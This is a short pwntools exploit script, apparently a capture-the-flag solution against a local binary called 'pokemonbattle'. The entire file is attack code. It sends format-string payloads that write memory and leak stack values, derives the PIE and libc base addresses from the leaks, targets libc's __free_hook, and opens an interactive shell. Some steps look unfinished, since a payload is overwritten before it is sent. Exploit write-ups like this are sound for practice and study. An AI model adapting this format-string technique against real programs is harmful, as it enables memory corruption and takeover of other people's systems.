from pwn import *

elf = ELF("./pokemonbattle")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.33.so")

p = elf.process()
raw_input("DEBUG")

payload = b"%112c"
payload += b"%7$hhn"

p.sendline(payload)

payload = b"%7$p-%15$p"

p.sendline(payload)

p.recvuntil("Choose a pokemon: ")
p.recvuntil("Choose a pokemon: ")
pie_leak = p.recvuntil("-",drop= True)

libc_leak = p.recvuntil(", I choose", drop = True)

pie_leak = int(pie_leak,16)
elf.address = pie_leak - 0x4150
log.info(hex(elf.address))

libc_leak = int(libc_leak,16)
libc.address = libc_leak - 0x277FD
log.info(hex(libc.address))

payload = p64(elf.address + 0x12be)
log.info(hex(elf.plt.system))

payload = p64(libc.sym.__free_hook)

p.sendline(payload)

p.interactive()

